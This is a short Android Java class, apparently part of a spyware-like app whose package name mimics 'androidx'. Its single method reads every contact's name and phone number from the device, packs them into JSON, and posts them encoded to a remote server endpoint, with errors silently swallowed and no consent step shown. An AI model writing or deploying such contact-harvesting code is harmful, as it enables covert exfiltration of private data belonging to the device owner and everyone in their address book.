package com.androix;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;

/**
 * Created by Rafael on 19/08/15.
 */
public class Contatos {


    public   void envia(Context ctx)
    {
        String contatos = null;

        JSONObject jContatos = new JSONObject();
        JSONArray jsonArray = new JSONArray();

        String[] PROJECTION = new String[] { ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER };

//        Cursor c = ctx.managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, null);
        Cursor c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, null);


        while(c.moveToNext()){
            JSONObject jGroup = new JSONObject();

            String nome =c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            String telefone = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            try{
                jGroup.put("nome", nome);
                jGroup.put("telefone", telefone);

                jsonArray.put(jGroup);
                jContatos.put("contatos", jsonArray);
            }catch(Exception e){

            }

            contatos = jContatos.toString();
        }

        String resp = new ConexaoHttp().post(Config.SEND_CONTATOS, Config.encode(contatos));
        Log.i("Servidor", resp);
    }


}